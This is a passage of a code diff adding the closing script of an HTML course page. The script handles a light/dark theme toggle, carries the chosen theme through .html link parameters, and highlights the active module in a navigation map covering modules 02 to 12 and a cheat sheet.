+        try { return localStorage.getItem('theme') || 'light'; } catch (e) { return 'light'; }
+    }
+    function syncNavLinks(t) {
+        document.querySelectorAll('a[href]').forEach(a => {
+            try {
+                const url = new URL(a.getAttribute('href'), location.href);
+                if (url.pathname.endsWith('.html')) {
+                    url.searchParams.set('theme', t);
+                    a.setAttribute('href', url.pathname.split('/').pop() + '?' + url.searchParams.toString());
+                }
+            } catch (e) {}
+        });
+    }
+    const initialTheme = getTheme();
+    applyTheme(initialTheme);
+    syncNavLinks(initialTheme);
+    const toggle = document.getElementById('themeToggle');
+    if (toggle) {
+        toggle.addEventListener('click', () => {
+            const newT = body.hasAttribute('data-theme') ? 'light' : 'dark';
+            applyTheme(newT);
+            try { localStorage.setItem('theme', newT); } catch (e) {}
+            try {
+                const url = new URL(location.href);
+                url.searchParams.set('theme', newT);
+                history.replaceState(null, '', url.toString());
+            } catch (e) {}
+            syncNavLinks(newT);
+        });
+    }
+    const path = window.location.pathname.split('/').pop();
+        const navMap = {
+            'index.html': 'nav-index',
+            'module_02.html': 'nav-02',
+            'module_03.html': 'nav-03',
+            'module_04.html': 'nav-04',
+            'module_05.html': 'nav-05',
+            'module_06.html': 'nav-06',
+            'module_07.html': 'nav-07',
+            'module_08.html': 'nav-08',
+            'module_09.html': 'nav-09',
+            'module_10.html': 'nav-10',
+            'module_11.html': 'nav-11',
+            'module_12.html': 'nav-12',
+        'cheat_sheet.html': 'nav-cheat'
+        };
+        const navId = navMap[path] || 'nav-index';
+        document.getElementById(navId).classList.add('active');
+    </script>
+    <script src="app.js"></script>
+</body>
+</html>
